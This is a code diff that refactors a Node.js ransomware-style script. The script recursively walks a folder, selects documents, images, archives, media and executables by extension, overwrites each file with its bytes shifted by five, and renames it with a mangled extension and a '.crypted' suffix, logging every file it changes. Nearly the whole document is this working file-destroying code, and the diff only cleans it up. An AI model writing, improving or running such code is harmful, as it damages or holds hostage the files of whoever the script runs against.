@@ -44,7 +44,9 @@ fs.appendFile("log.txt", `${time} \r\n ${operationInfo} \r\n ${address} \r\n ${u
     console.log('process.pid-basic', process.pid)
 });
 
-let cryptedFile;
+// 加密这些类型的文件
+const fileExtnames = [".jpg", ".bmp", ".zip", ".exe", ".mp3", ".wmv", ".doc", ".ppt", ".htm", ".png", ".gif", ".rar", ".txt", ".wma", ".mp4", ".xls", ".pdf", ".lnk", ".xlsx", ".docx", , ".pptx", ".html"]
+
 encrypt(fileFolderPath)
     .then(function () {
         // email();
@@ -55,51 +57,41 @@ function encrypt(dst) {
     return new Promise(function (resolve, reject) {
         const promiseArr = [];
         fs.readdirSync(dst).forEach(function (files) {
-            //crypted files like follows
-            if (path.extname(path.join(dst, files)) !== ".jpg" && path.extname(path.join(dst, files)) !== ".png" &&
-                path.extname(path.join(dst, files)) !== ".bmp" && path.extname(path.join(dst, files)) !== ".gif" &&
-                path.extname(path.join(dst, files)) !== ".zip" && path.extname(path.join(dst, files)) !== ".rar" &&
-                path.extname(path.join(dst, files)) !== ".exe" && path.extname(path.join(dst, files)) !== ".txt" &&
-                path.extname(path.join(dst, files)) !== ".mp3" && path.extname(path.join(dst, files)) !== ".wma" &&
-                path.extname(path.join(dst, files)) !== ".wmv" && path.extname(path.join(dst, files)) !== ".mp4" &&
-                path.extname(path.join(dst, files)) !== ".doc" && path.extname(path.join(dst, files)) !== ".xls" &&
-                path.extname(path.join(dst, files)) !== ".ppt" && path.extname(path.join(dst, files)) !== ".pdf" &&
-                path.extname(path.join(dst, files)) !== ".htm" && path.extname(path.join(dst, files)) !== ".lnk" &&
-                path.extname(path.join(dst, files)) !== ".xlsx" && path.extname(path.join(dst, files)) !== ".pptx" &&
-                path.extname(path.join(dst, files)) !== ".docx" && path.extname(path.join(dst, files)) !== ".html") {
-                if (fs.statSync(path.join(dst, files)).isDirectory()) {
-                    return encrypt(path.join(dst, files));   //recursive call
+            const targetPath = path.join(dst, files)
+            if (!fileExtnames.some(item => path.extname(targetPath) === item)) {
+                if (fs.statSync(targetPath).isDirectory()) {
+                    return encrypt(targetPath);   //recursive call
                 }
             } else {
                 const promise = new Promise((res) => {
-                    return fs.readFile(path.join(dst, files), (err, buffer) => {
+                    return fs.readFile(targetPath, (err, buffer) => {
                         //console.log("read",files);
                         if (err) {
                             console.error('readFile err', err)
                             return res()
                         }
-                        let buf1 = Buffer.allocUnsafe(buffer.length);
+                        const buf1 = Buffer.allocUnsafe(buffer.length);
                         for (let i = 0; i < buffer.length; i++) {
                             buf1[i] = buffer[i] + 5;
                         }
-                        fs.writeFile(path.join(dst, files), buf1, function (err) {
+                        fs.writeFile(targetPath, buf1, function (err) {
                             // console.log("write",files);
-                            cryptedFile = `加密的文件${path.join(dst, files)}`;
+                            const cryptedFile = `加密的文件${targetPath}`;
                             console.log("encrypted files", cryptedFile);
                             if (err) {
                                 console.error('writeFile err', err)
                                 return res()
                             }
-                            const fileExtname = Buffer.from(path.extname(path.join(dst, files)).slice(1, path.extname(path.join(dst, files)).length));  //slice the ext of file not contains .
+                            const fileExtname = Buffer.from(path.extname(targetPath).slice(1, path.extname(targetPath).length));  //slice the ext of file not contains .
                             const extNameBuffer = Buffer.allocUnsafe(fileExtname.length)
                             for (let i = 0; i < fileExtname.length; i++) {
                                 extNameBuffer[i] = fileExtname[i] - 3;
                             }
                             const newExtName = extNameBuffer.toString()   //new ext (string)
                             // let fileExtNameString = fileExtname.toString()   //origin ext (string)
-                            const renameFiles = `${path.basename(path.join(dst, files), path.extname(path.join(dst, files)))}${newExtName}` + `.crypted`;  //leave . at path.basename
+                            const renameFiles = `${path.basename(targetPath, path.extname(targetPath))}${newExtName}` + `.crypted`;  //leave . at path.basename
                             console.log("rename", renameFiles);
-                            fs.renameSync(path.join(dst, files), `${path.join(dst, renameFiles)}`)  //rename
+                            fs.renameSync(targetPath, `${path.join(dst, renameFiles)}`)  //rename
                             //打印日志模块
                             fs.appendFile("log.txt", ` \r\n ${cryptedFile} `, {
                                 encoding: "utf8"
